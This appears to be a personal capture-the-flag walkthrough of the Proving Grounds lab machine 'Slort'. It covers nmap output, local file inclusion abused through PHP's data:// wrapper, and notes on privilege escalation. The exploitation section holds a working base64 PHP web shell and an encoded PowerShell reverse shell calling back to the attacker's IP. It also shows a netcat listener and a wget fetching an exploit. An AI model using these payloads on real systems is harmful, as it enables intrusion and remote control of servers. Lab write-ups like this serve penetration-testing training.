# Slort

1. nmap to reveal web server
2. Dir enumeration of web server to reveal site
3. Site takes in php file name as parameter, quite obviously LFI, and thus exploited it to obtain RCE
4. Unusual directory at root of drive, reveals scheduled task.
	1. The executable is modifiable, replaced with our reverse shell executable to obtain administrator access

# Enumeration

Everything done through autorecon

## nmap

```
# Nmap 7.91 scan initiated Sun Jan 16 05:45:36 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nickel/results/192.168.225.99/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nickel/results/192.168.225.99/scans/xml/_full_tcp_nmap.xml" 192.168.225.99
adjust_timeouts2: packet supposedly had rtt of -247887 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -247887 microseconds.  Ignoring time.
Nmap scan report for 192.168.225.99
Host is up, received user-set (0.24s latency).
Scanned at 2022-01-16 05:45:37 EST for 350s
Not shown: 65528 filtered ports
Reason: 65528 no-responses
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYR4Bx82VWETlsjIFs21j6lZ6/S40jMJvuXF+ay4Qz4b+ws2YobB5h0+IrHdr3epMNFmSY8JXFWzIILhkvF/rmadXRtGwib1VZkSa3nr5oYdMajoWK0jOVSoFJmDTJvhj+T3XE7+Q0tEkQ2EeGPrz7nK5XWzBp8SZdywCE/iz1HLvUIlsOqpDWHSjrnjkUaaleTgoVTEi63Dx4inY2KS5mX2mnS/mLzMlLZ0qj8vL9gz6ZJgf7LMNhXb/pWOtxfn6zmSoVHXEXgubXwLtrn4wOIvbZkm5/uEx+eFzx1AOEQ2LjaKItEqLlP3E5sdutVP6yymDTGBtlXgfvtfGS2lgZiitorAXjjND6Sqcppp5lQJk2XSBJC58U0SzjXdyflJwsus5mnKnX79nKxXPNPwM6Z3Ki1O9vE+KsJ1dZJuaTINVgLqrgwJ7BCkI2HyojfqzjHs4FlYVHnukjqunG90OMyAASSR0oEnUTPqFmrtL/loEc3h44GT+8m9JS1LgdExU=
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDJYE805huwKUl0fJM8+N9Mk7GUQeEEc5iA/yYqgxE7Bwgz4h5xufRONkR6bWxcxu8/AHslwkkDkjRKNdr4uFzY=
|   256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL8cLYuHBTVFfYPb/YzUIyT39bUzA/sPDFEC/xChZyZ4
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2022-01-16T10:50:19+00:00
| ssl-cert: Subject: commonName=nickel
| Issuer: commonName=nickel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-01-15T10:44:55
| Not valid after:  2022-07-17T10:44:55
| MD5:   8296 c628 9f00 3a2b 6ddb 594e 0281 cb0f
| SHA-1: 822e 9680 5729 7d97 d76c d23c 60b5 83e5 9b94 0013
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIQXxTaaHntc6RG6qwReBQG+DANBgkqhkiG9w0BAQsFADAR
| MQ8wDQYDVQQDEwZuaWNrZWwwHhcNMjIwMTE1MTA0NDU1WhcNMjIwNzE3MTA0NDU1
| WjARMQ8wDQYDVQQDEwZuaWNrZWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQDly/vmp00kCX31dd9QTeRGu3ItdtQNYM4TJrK99vAuh5uDYWlr5f6VRUZb
| toKy2GCJLwTATLU7GOiOu/Q1asag3CitGi01gq23WEkOgrBW2+AyKi38R1+hYsFn
| 1wHH5HlUbTQN33yhDVXwPdxnqXh1oAiCBvOOZfBSiAgWTUBooA7YM9tJVmtkT+bi
| DYaG3ZF4RS3shMquqEg9490Tto4RN3USeuzLEDZXLAiQeapL3ZbPcNGZHEWPduZN
| 6yfEryzOh535Kg6Nkte/aapnwit/HFJN/drCKxciizU+/ahUOXVvmuSppInMVftT
| bj01sS5csyHdOKetsc16+OsRg+6dAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF
| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEAXO/WHNHNEWpp5eQY
| GWEhYKEkrWYAQ+xzPO7B08Pn6+0wRu+PgW1YCPVffwqxWwRm61zF+pH5eFnNtbum
| Xu91sx9tadJZ57Z6kZvDrIgZaoWO8LtIyXn1BuFrpwbZ92tzfkvL72rtcI9GHggg
| lGdrjUIsQ4ZaX8z/s9tQ917Ut+dpUit2qDgPVwKrzNNPDKU9LcvsVG8iLW/NyaEG
| GnYQuVxlkOc7WrLrmebJOwFpR9d3NV1pfb/csbAnNjUi8ENjMNFBjytP/BLCqKKJ
| lkIsNJn8IwF+JPouNMFCXBJnYa0eTTgOiSiMXXKDboNMBx6YMbQxlDdW2khkddcU
| L7kQvg==
|_-----END CERTIFICATE-----
|_ssl-date: 2022-01-16T10:51:27+00:00; +2s from scanner time.
8089/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-favicon: Unknown favicon MD5: 9D1EAD73E678FA2F51A70A933B0BF017
| http-methods: 
|_  Supported Methods: GET
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
33333/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-favicon: Unknown favicon MD5: 76C5844B4ABE20F72AA23CBE15B2494E
| http-methods: 
|_  Supported Methods: GET POST
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|98 (88%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_98
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows XP SP3 (88%), Microsoft Windows 98 SE (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/16%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=61E3F8AF%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=108%TS=U)
SEQ(SP=103%GCD=1%ISR=107%II=I%TS=U)
OPS(O1=M506NW8NNS%O2=M506NW8NNS%O3=M506NW8%O4=M506NW8NNS%O5=M506NW8NNS%O6=M506NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M506NW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 51811/tcp): CLEAN (Timeout)
|   Check 2 (port 10967/tcp): CLEAN (Timeout)
|   Check 3 (port 27269/udp): CLEAN (Timeout)
|   Check 4 (port 59903/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   244.42 ms 192.168.49.1
2   244.52 ms 192.168.225.99

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 16 05:51:27 2022 -- 1 IP address (1 host up) scanned in 351.69 seconds

```

## Dir enumeration

I used feroxbuster which revealed this line

```
301        9l       30w      346c http://192.168.225.53:8080/site
```

Visiting this revealed this site. The parameter looked interesting

![](Pasted%20image%2020220116203440.png)
# Exploit - LFI

## Testing

![](Pasted%20image%2020220116202001.png)

## Injecting Content via data://

Following Hacktricks guide on LFI, I tried injecting custom content directly into the parameter

```
┌──(kali㉿kali)-[~]
└─$ curl "http://192.168.225.53:8080/site/index.php?page=data://text/plain,%3C?php%20echo%20base64_encode(file_get_contents(%22index.php%22));%20?%3E"
PD9waHANCgkkcGFnZSA9IG51bGw7DQoJaWYgKGlzc2V0KCRfR0VUWyJwYWdlIl0pKSB7DQoJCWluY2x1ZGUoJF9HRVRbInBhZ2UiXSk7DQoJfQ0KCWVsc2Ugew0KCQllY2hvICJFUlJPUjogTm8gcGFnZSBzcGVjaWZpZWQuLi4iOw0KCQloZWFkZXIoIkxvY2F0aW9uOiBpbmRleC5waHA/cGFnZT1tYWluLnBocCIsIHRydWUsIDMwMSk7DQoJCWV4aXQoKTsNCgl9DQo/Pg==                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl "http://192.168.225.53:8080/site/index.php?page=data://text/plain,%3C?php%20echo%20base64_encode(file_get_contents(%22index.php%22));%20?%3E" | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   280  100   280    0     0    576      0 --:--:-- --:--:-- --:--:--   577
<?php
        $page = null;
        if (isset($_GET["page"])) {
                include($_GET["page"]);
        }
        else {
                echo "ERROR: No page specified...";
                header("Location: index.php?page=main.php", true, 301);
                exit();
        }
?>                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 

```


## RCE 
I then used this to obtain Remote Code Execution as well as a shell

```
┌──(kali㉿kali)-[~]
└─$ curl "http://192.168.225.53:8080/site/index.php?page=$(urlencode 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=')"
<br />
<b>Notice</b>:  Undefined index: cmd in <b>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=</b> on line <b>1</b><br />
<br />
<b>Warning</b>:  system(): Cannot execute a blank command in <b>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=</b> on line <b>1</b><br />
Shell done !                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl "http://192.168.225.53:8080/site/index.php?page=$(urlencode 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=')&cmd=$(urlencode whoami)"
slort\rupert
Shell done !                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl "http://192.168.225.53:8080/site/index.php?page=$(urlencode 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=')&cmd=$(urlencode powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADIAMgA1ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=)"

```

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443           
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.49.225] from (UNKNOWN) [192.168.225.53] 49986

PS C:\xampp\htdocs\site> whoami
slort\rupert
PS C:\xampp\htdocs\site> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
PS C:\xampp\htdocs\site> cd \Users\
PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         12/3/2021   8:32 AM                Admin                                                                
d-----         12/3/2021   8:40 AM                Administrator                                                        
d-r---         12/3/2021   8:26 AM                Public                                                               
d-----         12/3/2021   8:37 AM                rupert                                                               


PS C:\Users> cd rupert
PS C:\Users\rupert> cd Desktop
PS C:\Users\rupert\Desktop> dir


    Directory: C:\Users\rupert\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/16/2022   3:43 AM             34 local.txt                                                            


PS C:\Users\rupert\Desktop> type proof.txt
PS C:\Users\rupert\Desktop> type local.txt
d978c525c617748cf2ba24768fa6498a
PS C:\Users\rupert\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.225.53
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.225.254
PS C:\Users\rupert\Desktop> 
```

![](Pasted%20image%2020220116202744.png)



# Privesc

## Filezilla Exploit test - Fail
Privesc - https://github.com/usualwyy/FilezillaExploit


```
PS C:\Users\rupert\Desktop> cd C:\xampp\htdocs\site
PS C:\xampp\htdocs\site> dir


    Directory: C:\xampp\htdocs\site


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         6/12/2020   7:45 AM                css                                                                  
d-----         6/12/2020   7:45 AM                fonts                                                                
d-----         6/12/2020   7:45 AM                images                                                               
d-----         6/12/2020   7:45 AM                js                                                                   
d-----         6/12/2020   7:45 AM                sass                                                                 
-a----         6/12/2020   7:45 AM          15439 about.php                                                            
-a----         6/12/2020   7:45 AM           8984 contact.php                                                          
-a----         6/12/2020   7:45 AM            208 index.php                                                            
-a----         6/12/2020   7:45 AM          17128 LICENSE.txt                                                          
-a----         6/12/2020   7:45 AM          12541 main.php                                                             
-a----         6/12/2020   7:45 AM          11865 portfolio.php                                                        
-a----         6/12/2020   7:45 AM            781 README.txt                                                           
-a----         6/12/2020   7:45 AM          11819 services.php                                                         


PS C:\xampp\htdocs\site> cd ..
PS C:\xampp\htdocs> dir


    Directory: C:\xampp\htdocs


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         6/12/2020   7:11 AM                dashboard                                                            
d-----         6/12/2020   7:11 AM                img                                                                  
d-----         8/31/2020   6:47 AM                site                                                                 
d-----         6/12/2020   7:11 AM                webalizer                                                            
d-----         6/12/2020   7:11 AM                xampp                                                                
-a----         8/27/2019   7:02 AM           3607 applications.html                                                    
-a----         8/27/2019   7:02 AM            177 bitnami.css                                                          
-a----         7/16/2015   8:32 AM          30894 favicon.ico                                                          
-a----         7/16/2015   8:32 AM            260 index.php                                                            


PS C:\xampp\htdocs> wget 192.168.49.225/FuckFilezilla_0_9_41.php -O exploit.php
PS C:\xampp\htdocs> cd C:\Users\rupert\
PS C:\Users\rupert> wget 127.0.0.1/exploit.php -o exploit.txt
PS C:\Users\rupert> type exploit.txt
PS C:\Users\rupert> whoami /users
PS C:\Users\rupert> net users

User accounts for \\SLORT

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
rupert                   WDAGUtilityAccount       
The command completed successfully.

PS C:\Users\rupert> 

```

## File Enum & Scheduled Task Exploit

```
PS C:\Users\rupert> dir /


    Directory: C:\


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         7/20/2020   7:08 AM                Backup                                                               
d-----         12/7/2019   1:14 AM                PerfLogs                                                             
d-r---         12/3/2021   8:58 AM                Program Files                                                        
d-r---         12/3/2021   8:22 AM                Program Files (x86)                                                  
d-r---         12/3/2021   8:29 AM                Users                                                                
d-----         12/3/2021   9:18 AM                Windows                                                              
d-----         6/12/2020   8:11 AM                xampp                                                                


PS C:\Users\rupert> cd /
PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         7/20/2020   7:08 AM                Backup                                                               
d-----         12/7/2019   1:14 AM                PerfLogs                                                             
d-r---         12/3/2021   8:58 AM                Program Files                                                        
d-r---         12/3/2021   8:22 AM                Program Files (x86)                                                  
d-r---         12/3/2021   8:29 AM                Users                                                                
d-----         12/3/2021   9:18 AM                Windows                                                              
d-----         6/12/2020   8:11 AM                xampp                                                                


PS C:\> cd Backup
PS C:\Backup> dir


    Directory: C:\Backup


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         6/12/2020   7:45 AM          11304 backup.txt                                                           
-a----         6/12/2020   7:45 AM             73 info.txt                                                             
-a----         6/23/2020   7:49 PM          73802 TFTP.EXE                                                             


PS C:\Backup> type backup.txt
AudMig: Device Ids match - {2}.\\?\hdaudio#func_01&ven_15ad&dev_1975&subsys_15ad1975&rev_1001#5&217be3d6&0&0001#{6994ad04-93ef-11d0-a3cc-00a0c9223196}\elineouttopo/00010001 {2}.\\?\hdaudio#func_01&ven_15ad&dev_1975&subsys_15ad1975&rev_1001#5&217be3d6&0&0001#{6994ad04-93ef-11d0-a3cc-00a0c9223196}\elineouttopo/00010001
AudMig: Migrated {a45c254e-df1c-4efd-8020-67d146a850e0},2 property at 1
AudMig: Migrated {9637b4b9-11ee-4c35-b43c-7b2452c993cc},1 property at 7
AudMig: Migrated {259abffc-50a7-47ce-af08-68c9a7d73366},12 property at 12
AudMig: Migrated {24dbb0fc-9311-4b3d-9cf0-18ff155639d4},1 property at 31
AudMig: Migrated {f19f064d-082c-4e27-bc73-6882a1bb8e4c},0 property at 32
AudMig: Migrated {b3f8fa53-0004-438e-9003-51a46e139bfc},0 property at 33
AudMig: Migrated {6737016f-5360-48ee-af05-e616c8ff27a7},2 property at 44
AudMig: Migrated {fd8a7b27-0b18-4025-ab1c-bdd6b32e1604},2 property at 45
AudMig: Migrated {908dba32-edff-4c28-8e45-c918561f6748},2 property at 46
AudMig: Migrated {913bc9a7-624b-4a30-96ac-5064a9fc6589},2 property at 47
AudMig: Migrated {a45429a4-aa63-4480-b7f8-3f2552daee93},2 property at 48
AudMig: Migrated {a45429a4-aa63-4480-b7f8-3f2552daee93},3 property at 49
AudMig: Migrated {a45429a4-aa63-4480-b7f8-3f2552daee93},4 property at 50
AudMig: Migrated {a45429a4-aa63-4480-b7f8-3f2552daee93},5 property at 51
AudMig: Migrated {a45429a4-aa63-4480-b7f8-3f2552daee93},6 property at 52
AudMig: Migrating role and device state from SOFTWARE\Microsoft\Windows\CurrentVersion\MMDevices\Audio\Render\{581858CA-F58C-4A6C-951D-175D8D8ABEF8} to SOFTWARE\Microsoft\Windows\CurrentVersion\MMDevices\Audio\Render\{DE259CA3-E0C9-415C-9A3E-836FE64A064A}
AudMig: Device Ids match - {2}.\\?\hdaudio#func_01&ven_15ad&dev_1975&subsys_15ad1975&rev_1001#5&217be3d6&0&0001#{6994ad04-93ef-11d0-a3cc-00a0c9223196}\emicintopo/00010001 {2}.\\?\hdaudio#func_01&ven_15ad&dev_1975&subsys_15ad1975&rev_1001#5&217be3d6&0&0001#{6994ad04-93ef-11d0-a3cc-00a0c9223196}\emicintopo/00010001
AudMig: Migrated {a45c254e-df1c-4efd-8020-67d146a850e0},2 property at 1
AudMig: Migrated {9637b4b9-11ee-4c35-b43c-7b2452c993cc},1 property at 7
AudMig: Migrated {259abffc-50a7-47ce-af08-68c9a7d73366},12 property at 12
AudMig: Migrated {f19f064d-082c-4e27-bc73-6882a1bb8e4c},0 property at 33
AudMig: Migrated {b3f8fa53-0004-438e-9003-51a46e139bfc},0 property at 36
AudMig: Migrating role and device state from SOFTWARE\Microsoft\Windows\CurrentVersion\MMDevices\Audio\Capture\{131E1481-E5E4-439E-BECB-5C4D2CA746FF} to SOFTWARE\Microsoft\Windows\CurrentVersion\MMDevices\Audio\Capture\{B1597C56-9B62-4E71-A707-F9FB2E4C4FDB}
2020-06-11 07:22:46, Info                  MIG    MigHost started with command line: {5EFEA7CB-6DA7-42D7-9285-C9F14B94B937} /InitDoneEvent:MigHost.{5EFEA7CB-6DA7-42D7-9285-C9F14B94B937}.Event /ParentPID:9040
2020-06-11 07:22:46, Info                  MIG    MigHost: CMigPluginSurrogate::Init: Successfully initialized surrogate.
2020-06-11 07:22:46, Info                  MIG    MigHost: Initialized successfully with CLSID[{5EFEA7CB-6DA7-42D7-9285-C9F14B94B937}] and LogDir=[]
2020-06-11 07:22:46, Info                  MIG    MigHost: CMigPluginSurrogate::LoadDllServer in progress: BinaryPath=[C:\$WINDOWS.~BT\Sources\ReplacementManifests\Microsoft-Windows-RasServer-MigPlugin\RasMigPlugin.dll], CLSID=[{D26AA4A5-92AD-48DB-8D59-95EF0DCE6939}], ApartmentThreadingModel=[0].
2020-06-11 07:22:46, Info                  MIG    MigHost: CMigPluginSurrogate::COMGenericThreadingHostThreadProc: ThreadID=[0xbc], Server=[C:\$WINDOWS.~BT\Sources\ReplacementManifests\Microsoft-Windows-RasServer-MigPlugin\RasMigPlugin.dll], CLSID=[{D26AA4A5-92AD-48DB-8D59-95EF0DCE6939}], ApartmentThreadingModel=[0]
2020-06-11 07:22:46, Info                  MIG    MigHost: CMigPluginSurrogate::LoadAndRegisterServerInThreadContext: Loaded server(C:\$WINDOWS.~BT\Sources\ReplacementManifests\Microsoft-Windows-RasServer-MigPlugin\RasMigPlugin.dll)
2020-06-11 07:22:46, Info                  MIG    MigHost: CMigPluginSurrogate::LoadAndRegisterServerInThreadContext: Successfully loaded and registered server(C:\$WINDOWS.~BT\Sources\ReplacementManifests\Microsoft-Windows-RasServer-MigPlugin\RasMigPlugin.dll)
2020-06-11 07:22:46, Info                  MIG    MigHost: CMigPluginSurrogate::COMGenericThreadingHostThreadProc: LoadAndRegisterServerInThreadContext() succeeded.
2020-06-11 07:22:46, Info                  MIG    MigHost: CMigPluginSurrogate::LoadDllServer finished: Result=[0x0].
2020-06-11 07:22:46, Info                  MIG    MigHost: CMigPluginSurrogate::COMGenericThreadingHostThreadProc: Exiting ThreadID=[0xbc].
2020-06-11 07:22:46, Info                  MIG    MigHost: Exiting process.
2020-06-11 07:37:00, Info                  MIG    MigHost started with command line: {E18CA047-3CAB-424D-A619-6908221CC4EF} /InitDoneEvent:MigHost.{E18CA047-3CAB-424D-A619-6908221CC4EF}.Event /ParentPID:9040
2020-06-11 07:37:00, Info                  MIG    MigHost: CMigPluginSurrogate::Init: Successfully initialized surrogate.
2020-06-11 07:37:00, Info                  MIG    MigHost: Initialized successfully with CLSID[{E18CA047-3CAB-424D-A619-6908221CC4EF}] and LogDir=[]
2020-06-11 07:37:05, Info                  MIG    MigHost: Exiting process.
2020-06-11 07:37:05, Info                  MIG    MigHost started with command line: {677D78AB-57DF-4334-A17D-9CE0FF827824} /InitDoneEvent:MigHost.{677D78AB-57DF-4334-A17D-9CE0FF827824}.Event /ParentPID:9040
2020-06-11 07:37:05, Info                  MIG    MigHost: CMigPluginSurrogate::Init: Successfully initialized surrogate.
2020-06-11 07:37:05, Info                  MIG    MigHost: Initialized successfully with CLSID[{677D78AB-57DF-4334-A17D-9CE0FF827824}] and LogDir=[]
2020-06-11 07:37:05, Info                  MIG    MigHost: Exiting process.
2020-06-11 07:37:07, Info                  MIG    MigHost started with command line: {782DCFA7-4D34-49D1-BA8C-9AFDCA518581} /InitDoneEvent:MigHost.{782DCFA7-4D34-49D1-BA8C-9AFDCA518581}.Event /ParentPID:9040
2020-06-11 07:37:07, Info                  MIG    MigHost: CMigPluginSurrogate::Init: Successfully initialized surrogate.
2020-06-11 07:37:07, Info                  MIG    MigHost: Initialized successfully with CLSID[{782DCFA7-4D34-49D1-BA8C-9AFDCA518581}] and LogDir=[]
2020-06-11 07:37:09, Info                  MIG    MigHost: Exiting process.
2020-06-11 07:37:09, Info                  MIG    MigHost started with command line: {C48597B6-CCD1-40C5-8713-C2AC75ED834C} /InitDoneEvent:MigHost.{C48597B6-CCD1-40C5-8713-C2AC75ED834C}.Event /ParentPID:9040
2020-06-11 07:37:09, Info                  MIG    MigHost: CMigPluginSurrogate::Init: Successfully initialized surrogate.
2020-06-11 07:37:09, Info                  MIG    MigHost: Initialized successfully with CLSID[{C48597B6-CCD1-40C5-8713-C2AC75ED834C}] and LogDir=[]
2020-06-11 07:37:09, Info                  MIG    MigHost: Exiting process.
2020-06-11 07:37:12, Info                  MIG    MigHost started with command line: {12A6A024-3D17-4D0C-BD70-4B4C6BDF7483} /InitDoneEvent:MigHost.{12A6A024-3D17-4D0C-BD70-4B4C6BDF7483}.Event /ParentPID:9040
2020-06-11 07:37:12, Info                  MIG    MigHost: CMigPluginSurrogate::Init: Successfully initialized surrogate.
2020-06-11 07:37:12, Info                  MIG    MigHost: Initialized successfully with CLSID[{12A6A024-3D17-4D0C-BD70-4B4C6BDF7483}] and LogDir=[]
2020-06-11 07:37:15, Info                  MIG    MigHost: Exiting process.
2020-06-11 07:37:15, Info                  MIG    MigHost started with command line: {A1B4EC9A-EFF0-4A74-A121-CEAFA75DFC70} /InitDoneEvent:MigHost.{A1B4EC9A-EFF0-4A74-A121-CEAFA75DFC70}.Event /ParentPID:9040
2020-06-11 07:37:15, Info                  MIG    MigHost: CMigPluginSurrogate::Init: Successfully initialized surrogate.
2020-06-11 07:37:15, Info                  MIG    MigHost: Initialized successfully with CLSID[{A1B4EC9A-EFF0-4A74-A121-CEAFA75DFC70}] and LogDir=[]
2020-06-11 07:37:15, Info                  MIG    MigHost: Exiting process.
2020-06-11 07:37:18, Info                  MIG    MigHost started with command line: {B09CB74E-6465-4D26-9962-5B4CFFAD352C} /InitDoneEvent:MigHost.{B09CB74E-6465-4D26-9962-5B4CFFAD352C}.Event /ParentPID:9040
2020-06-11 07:37:18, Info                  MIG    MigHost: CMigPluginSurrogate::Init: Successfully initialized surrogate.
2020-06-11 07:37:18, Info                  MIG    MigHost: Initialized successfully with CLSID[{B09CB74E-6465-4D26-9962-5B4CFFAD352C}] and LogDir=[]
